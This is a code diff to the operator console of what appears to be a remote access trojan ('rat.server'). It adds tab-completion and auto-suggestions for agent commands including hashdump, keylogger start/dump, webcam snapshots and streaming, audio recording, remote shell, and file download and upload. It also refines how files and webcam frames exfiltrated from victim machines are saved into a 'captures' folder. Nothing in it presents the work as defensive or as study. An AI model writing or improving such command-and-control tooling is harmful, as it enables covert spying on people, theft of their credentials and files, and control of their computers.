@@ -6,7 +6,9 @@ from dataclasses import dataclass
 from pathlib import Path
 
 from prompt_toolkit import PromptSession
-from prompt_toolkit.completion import WordCompleter
+from prompt_toolkit.auto_suggest import AutoSuggest, Suggestion
+from prompt_toolkit.completion import Completer, Completion
+from prompt_toolkit.document import Document
 
 from rat.server.app import ServerApp, Session
 
@@ -25,6 +27,58 @@ SERVER_COMMANDS = [
     "quit",
 ]
 
+AGENT_COMMAND_LINES = [
+    "help",
+    "ipconfig",
+    "search ",
+    "screenshot",
+    "webcam_snapshot",
+    "record_audio ",
+    "hashdump",
+    "keylogger start",
+    "keylogger stop",
+    "keylogger dump",
+    "shell ",
+    "download ",
+    "upload ",
+    "webcam_stream start ",
+    "webcam_stream stop",
+    "back",
+    "exit",
+    "quit",
+]
+
+
+def _command_suffix(text: str, commands: list[str]) -> str | None:
+    prefix = text.lstrip()
+    if not prefix:
+        return None
+    for command in commands:
+        if command.startswith(prefix) and command != prefix:
+            return command[len(prefix) :]
+    return None
+
+
+class ContextualCommandCompleter(Completer):
+    def __init__(self, state: CLIState) -> None:
+        self._state = state
+
+    def get_completions(self, document: Document, complete_event):
+        commands = AGENT_COMMAND_LINES if self._state.active_session_id else SERVER_COMMANDS
+        suffix = _command_suffix(document.text_before_cursor, commands)
+        if suffix:
+            yield Completion(suffix, start_position=0)
+
+
+class ContextualCommandAutoSuggest(AutoSuggest):
+    def __init__(self, state: CLIState) -> None:
+        self._state = state
+
+    def get_suggestion(self, buffer, document: Document) -> Suggestion | None:
+        commands = AGENT_COMMAND_LINES if self._state.active_session_id else SERVER_COMMANDS
+        suffix = _command_suffix(document.text_before_cursor, commands)
+        return Suggestion(suffix) if suffix else None
+
 
 def _format_session(sess: Session) -> str:
     age = int(time.time() - sess.connected_at)
@@ -37,7 +91,8 @@ def _format_session(sess: Session) -> str:
 def run_cli(app: ServerApp) -> None:
     state = CLIState()
     session: PromptSession[str] = PromptSession()
-    completer = WordCompleter(SERVER_COMMANDS, ignore_case=True)
+    completer = ContextualCommandCompleter(state)
+    auto_suggest = ContextualCommandAutoSuggest(state)
 
     def prompt_text() -> str:
         if state.active_session_id is None:
@@ -46,7 +101,9 @@ def run_cli(app: ServerApp) -> None:
 
     while True:
         try:
-            line = session.prompt(prompt_text(), completer=completer).strip()
+            line = session.prompt(
+                prompt_text(), completer=completer, auto_suggest=auto_suggest
+            ).strip()
         except (EOFError, KeyboardInterrupt):
             app.log.info("Exiting.")
             return
@@ -133,34 +190,35 @@ def _handle_agent_command(app: ServerApp, state: CLIState, line: str) -> None:
 
         result = sess.peer.request("run", {"line": line}, timeout=120.0)
         data = result.get("data", {})
-        app.log.info("Result: %s", data)
-        _maybe_save_artifact(app, sess.session_id, data)
+        if _maybe_save_artifact(app, sess.session_id, data) is None:
+            app.log.info("Result: %s", data)
     except Exception as exc:
         app.log.error("Command failed: %s", exc)
 
 
-def _maybe_save_artifact(app: ServerApp, session_id: str, data: object) -> None:
+def _maybe_save_artifact(app: ServerApp, session_id: str, data: object) -> Path | None:
     if not isinstance(data, dict):
-        return
+        return None
     nested = data.get("data")
     if isinstance(nested, dict):
         data = nested
     filename = data.get("filename")
     b64 = data.get("bytes_b64")
     if not isinstance(filename, str) or not isinstance(b64, str):
-        return
+        return None
     try:
         import base64
 
         raw = base64.b64decode(b64.encode())
     except Exception as exc:
         app.log.warning("artifact decode failed: %s", exc)
-        return
+        return None
     out_dir = Path("captures") / f"agent-{session_id}"
     out_dir.mkdir(parents=True, exist_ok=True)
     out_path = out_dir / filename
     out_path.write_bytes(raw)
     app.log.info("Saved artifact to %s", out_path)
+    return out_path
 
 
 def _server_download(app: ServerApp, sess: Session, args: list[str]) -> None:
@@ -273,6 +331,28 @@ def _server_webcam_stream(app: ServerApp, sess: Session, args: list[str]) -> Non
             continue
         (out_dir / f"frame-{frame_idx:05d}.jpg").write_bytes(bytes(jpeg))
         frame_idx += 1
-
     sess.peer.request("webcam_stream_stop", {}, timeout=10.0)
+    if frame_idx == 0:
+        app.log.warning("Webcam stream saved 0 frames. Check webcam permissions/client logs.")
     app.log.info("Webcam stream saved %s frames.", frame_idx)
+
+
+def _save_stream_snapshot_frame(out_dir: Path, frame_idx: int, result: object) -> int:
+    if not isinstance(result, dict):
+        return 0
+    data = result.get("data", {})
+    if isinstance(data, dict) and isinstance(data.get("data"), dict):
+        data = data["data"]
+    if not isinstance(data, dict):
+        return 0
+    b64 = data.get("bytes_b64")
+    if not isinstance(b64, str):
+        return 0
+    try:
+        import base64
+
+        raw = base64.b64decode(b64.encode())
+    except Exception:
+        return 0
+    (out_dir / f"frame-{frame_idx:05d}.jpg").write_bytes(raw)
+    return 1
